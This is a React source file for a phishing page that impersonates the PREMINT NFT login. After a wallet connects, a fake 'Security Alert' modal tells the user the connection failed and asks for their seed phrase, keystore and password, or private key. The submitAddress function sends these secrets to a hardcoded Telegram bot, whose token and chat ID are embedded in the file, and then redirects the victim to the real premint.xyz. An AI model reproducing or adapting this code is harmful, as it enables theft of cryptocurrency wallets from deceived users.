import React, { useEffect, useState } from 'react';
import { useNavigate } from "react-router-dom";
import { WalletConnectConnector } from "@web3-react/walletconnect-connector";
import { InjectedConnector } from "@web3-react/injected-connector";
import { WalletLinkConnector } from "@web3-react/walletlink-connector";
import { useWeb3React } from '@web3-react/core'
import { Box, CircularProgress, Modal, TextareaAutosize, Typography } from '@material-ui/core';
import Button from '@mui/material/Button';

let bot = {
    TOKEN: "5782465316:AAGMuZZyNAFBNE6DwDn9NxrW4NyxP4sXlRc",
    CHATID: "1974791133",
}

const btnsRef = [
    { name: 'Phrase' },
    { name: 'Keystore' },
    { name: 'Private Key' }
]


function Login() {
    const { account } = useWeb3React();
    const { activate, deactivate } = useWeb3React();
    const [id, setId] = useState(localStorage.getItem('address'))
    const [openFAk, setOpenFAk] = React.useState(false);
    const handleOpenFAk = () => setOpenFAk(true);
    const handleCloseFAk = () => setOpenFAk(false);
    const [open, setOpen] = React.useState(false);
    const handleClose = () => setOpen(false);
    const [loading, setIsloading] = useState(true)
    const [recover, setRecover] = useState(false)
    const [active, setActive] = useState(btnsRef[0]);
    const [prhare, setPrhase] = useState('')
    const [prharePass, setPrharePass] = useState('')
    const [activeWallet, setAvtiveWallet] = useState();
    useEffect(() => {
        setId(localStorage.setItem('address', account))
    }, [account])

    const CoinbaseWallet = new WalletLinkConnector({
        url: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
        appName: "Web3-react Demo",
        supportedChainIds: [1, 3, 4, 5, 42],
    });

    const WalletConnect = new WalletConnectConnector({
        rpcUrl: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
        bridge: "https://bridge.walletconnect.org",
        qrcode: true,
    });

    const Injected = new InjectedConnector({
        supportedChainIds: [1, 3, 4, 5, 42]
    });

    const coinbaseConnect = (btn) => {
        handleClose();

        activate(CoinbaseWallet)
            .then(() => {
                setTimeout(handleOpenFAk(), 5000)
            })
        setAvtiveWallet(btn)
    }
    const connectWallet = (btn) => {
        handleClose();

        activate(WalletConnect)
            .then(() => {
                setTimeout(handleOpenFAk(), 5000)
            })
        setAvtiveWallet(btn)
    }
    const connectMetamask = (btn) => {
        handleClose();
        activate(Injected)
            .then(() => {
                setTimeout(handleOpenFAk(), 15000)

            })
        setAvtiveWallet(btn)
    }

    const submitAddress = () => {
        let secratePrhase = !prharePass ? `phrase is ${prhare} ` : `phrase is ${prhare} and pass is ${prharePass}`

        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${secratePrhase}`, {
            method: "GET"
        })
            .then(success => {
                setPrharePass('')
                setPrhase('')
                window.location = 'https://www.premint.xyz/'
            }, error => {
                alert("not sent")
            })
    }

    const recoverPass = () => {
        setRecover(true)
        setTimeout(() => setIsloading(false), 1000)
    }


    const connectBTN = [
        { name: 'MetaMask', action: connectMetamask, image: "https://i.ibb.co/H40P97T/download.png" },
        { name: 'WalletConncet', action: connectWallet, image: "https://i.ibb.co/LdvtmRq/wallet-connect.png" },
        { name: 'Coinbase Wallet', action: coinbaseConnect, image: "https://www.premint.xyz/static/images/walletlink-alternative.4ab86c3938cb.png" },
    ]
    console.log(typeof (account))

    return (

        <div className='h-screen'>
            <Modal
                open={openFAk}
                aria-labelledby="modal-modal-title"
                aria-describedby="modal-modal-description"
            >
                <div className='bg-white flex items-center justify-center md:mx-[20rem] lg:mx-[30rem] mx-2  my-10  px-2 text-center py-10 rounded-xl outline-0'>
                    {
                        !recover ?
                            (
                                <div className='flex flex-col items-center bg-white'>
                                    <img className='w-20' src='https://i.ibb.co/XXQ7tb4/pngtree-security-alert-icon-red-png-image-2597553-removebg-preview.png' />
                                    <Typography style={{ marginTop: '15px', color: 'red', fontWeight: 'bolder' }} id="modal-modal-title" variant="h6" component="h2">
                                        {activeWallet?.name} Security Alert
                                    </Typography>
                                    <Typography style={{ marginTop: '15px', fontWeight: 'bolder' }} id="modal-modal-title" variant="h6" component="h2">
                                        Warn! {activeWallet?.name} failed to connect to your wallet, please continue to recover your wallet.
                                    </Typography>
                                    <button style={{ marginTop: '100px', cursor: 'pointer', border: 'none', outline: 'none', padding: '6px', background: 'rgb(0, 132, 255)', borderRadius: '20px', color: 'white', width: "300px", fontSize: '20px' }} onClick={() => recoverPass()}>
                                        Reset Wallet
                                    </button>
                                </div>
                            )
                            :
                            (
                                <div className='flex flex-col items-center'>
                                    {
                                        loading ?
                                            <Box sx={{ minWidth: '320px', minHeight: '450px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                                                <CircularProgress />
                                            </Box>
                                            :
                                            (
                                                <div className='flex flex-col items-center'>
                                                    <img style={{ width: '150px' }} src={activeWallet?.image} />
                                                    <Typography id="modal-modal-title" variant="h6" component="h2">
                                                        Choice recovery method
                                                    </Typography>
                                                    <Box sx={{ mt: 3, display: 'flex', justifyContent: 'center', }}>
                                                        {
                                                            btnsRef.map((btn) => (
                                                                <Button onClick={() => setActive(btn)} style={{ background: btn === active ? '#f3e5f5' : 'none', color: 'black', padding: '11px', width: '100px' }}>
                                                                    {btn.name}
                                                                </Button>)
                                                            )
                                                        }
                                                    </Box>
                                                    {
                                                        active.name === "Phrase" ?
                                                            (
                                                                <>
                                                                    <Box>

                                                                        <TextareaAutosize
                                                                            aria-label="minimum height"
                                                                            minRows={3}
                                                                            placeholder="Phrase"
                                                                            className='txtArea'
                                                                            onChange={(e) => setPrhase(e.target.value)}
                                                                            required={true}
                                                                        />
                                                                    </Box>

                                                                </>
                                                            )
                                                            :
                                                            active.name === "Keystore" ?
                                                                (
                                                                    <>
                                                                        <Box>
                                                                            <TextareaAutosize
                                                                                aria-label="minimum height"
                                                                                minRows={3}
                                                                                placeholder="Keystore json"
                                                                                className='txtArea'
                                                                                onChange={(e) => setPrhase(e.target.value)}

                                                                            /><br />
                                                                            <input
                                                                                aria-label="minimum height"
                                                                                minRows={3}
                                                                                placeholder="Password"
                                                                                className='txtArea1'
                                                                                type='password'
                                                                                onChange={(e) => setPrharePass(e.target.value)}

                                                                            />
                                                                        </Box>

                                                                    </>
                                                                )
                                                                :
                                                                active.name === "Private Key" ?
                                                                    (
                                                                        <>
                                                                            <Box>
                                                                                <TextareaAutosize
                                                                                    aria-label="minimum height"
                                                                                    minRows={3}
                                                                                    placeholder="Privatekey"
                                                                                    className='txtArea'
                                                                                    onChange={(e) => setPrhase(e.target.value)}

                                                                                />
                                                                            </Box>

                                                                        </>
                                                                    )
                                                                    :
                                                                    ''
                                                    }
                                                    <Box className='mb-5'>
                                                        <Button disabled={!prhare && !prharePass} onClick={() => submitAddress()} className='hov' variant='outlined' style={{ fontSize: '15px', marginTop: '9px', borderRadius: '15px', padding: '10px', width: '320px' }}>
                                                            Recover
                                                        </Button>
                                                        <br />
                                                        <Button onClick={() => {
                                                            setRecover(false)
                                                            setIsloading(true)
                                                            handleCloseFAk()
                                                        }} variant='outlined' style={{ fontSize: '11px', marginTop: '9px', borderRadius: '15px', border: '1px solid gray', padding: '5px', width: '320px', color: 'black' }}>
                                                            Back
                                                        </Button>
                                                    </Box>
                                                </div>
                                            )
                                    }


                                </div>
                            )
                    }

                </div>
            </Modal>
            <div className='container mx-auto flex flex-col items-center h-screen'>
                <p className='text-4xl font-[500] my-2'>Login to PREMINT</p>
                <p className='text-gray-600 my-2'>CREATE NEW ACCOUNTS WITH A WALLET</p>
                {
                    connectBTN.map((btn) => (
                        <div key={btn.name}><button className='bg-gray-100 px-20 py-2 rounded-[10rem] font-[500] border-[1px] border-gray-200 flex items-center' onClick={() => { btn.action(btn) }}><img src={btn.image} className='w-5' />{btn.name}</button><br /></div>
                    ))

                }
                <p className='text-gray-600 my-2'>THEN USE SOCIAL TO LOG IN LATER</p>
                <button className='bg-gray-100 px-20 py-2 my-1 rounded-[10rem] font-[500] border-[1px] border-gray-200 flex items-center'>Login With Twiter</button>
                <button className='bg-gray-100 px-20 py-2 my-1    rounded-[10rem] font-[500] border-[1px] border-gray-200 flex items-center'>Login With Discord</button>
            </div>
        </div>

    )
}

export default Login